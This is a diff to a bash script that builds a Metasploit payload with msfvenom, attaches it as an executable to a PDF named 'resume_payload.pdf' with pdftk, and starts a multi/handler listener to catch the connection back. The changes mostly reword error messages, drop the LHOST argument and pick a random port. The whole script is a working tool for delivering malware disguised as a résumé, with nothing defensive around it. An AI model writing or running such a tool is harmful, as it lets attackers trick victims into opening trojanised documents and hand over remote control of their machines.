@@ -1,29 +1,29 @@
 #!/bin/bash
 
 # Validate user input
-if [[ $# -eq 0 ]] || [[ $# -gt 2 ]]; then
-    echo "Usage: $0 <PDF file> [LHOST]"
+if [[ $# -eq 0 ]] || [[ $# -gt 1 ]]; then
+    echo "Usage: $0 <PDF file>"
     exit 1
 fi
 
 if [ ! -f "$1" ]; then
-    echo "File not found: $1"
+    echo "Error: File not found: $1"
     exit 1
 fi
 
 # Set the target IP address and port number
-LHOST="${2:-$(ip route get 1 | awk '{print $NF;exit}')}"
-LPORT="4444"
+LHOST="$(ip route get 1 | awk '{print $NF;exit}')"
+LPORT=$(shuf -i 2000-65000 -n 1)
 
 # Check if pdftk is installed
 if ! command -v pdftk &> /dev/null; then
-    echo "pdftk could not be found. Please install pdftk before running this script." >&2
+    echo "Error: pdftk could not be found. Please install pdftk before running this script." >&2
     exit 1
 fi
 
 # Check if msfvenom is installed
 if ! command -v msfvenom &> /dev/null; then
-    echo "msfvenom could not be found. Please install Metasploit Framework before running this script." >&2
+    echo "Error: msfvenom could not be found. Please install Metasploit Framework before running this script." >&2
     exit 1
 fi
 
@@ -41,40 +41,41 @@ WORKDIR=$(mktemp -d)
 
 # Check if the temporary directory was created successfully
 if [ ! -d "$WORKDIR" ]; then
-    echo "Could not create temporary directory." >&2
+    echo "Error: Could not create temporary directory." >&2
     exit 1
 fi
 
 # Create the executable file with the generated payload
 if ! echo -n "$PAYLOAD" > "$WORKDIR/payload.exe"; then
-    echo "Could not create payload file." >&2
+    echo "Error: Could not create payload file." >&2
     rm -rf "$WORKDIR"
     exit 1
 fi
 
 # Inject the executable file into the PDF using pdftk
 if ! pdftk "$1" attach_files "$WORKDIR/payload.exe" to_page 1 output "$WORKDIR/resume_payload.pdf"; then
-    echo "Could not inject payload into PDF file." >&2
+    echo "Error: Could not inject payload into PDF file." >&2
     rm -rf "$WORKDIR"
     exit 1
 fi
 
 # Start the Metasploit listener in the background
-if ! msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &; then
-    echo "Could not start Metasploit listener." >&2
+if ! msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &> /dev/null; then
+    echo "Error: Could not start Metasploit listener." >&2
     rm -rf "$WORKDIR"
     exit 1
 fi
 
 # Open the PDF file with the injected payload
 if ! xdg-open "$WORKDIR/resume_payload.pdf"; then
-    echo "Could not open PDF file." >&2
+    echo "Error: Could not open PDF file." >&2
     rm -rf "$WORKDIR"
     exit 1
 fi
 
 # Clean up the temporary directory
 if ! rm -rf "$WORKDIR"; then
-    echo "Could not clean up temporary files." >&2
+    echo "Error: Could not clean up temporary files." >&2
     exit 1
 fi
+
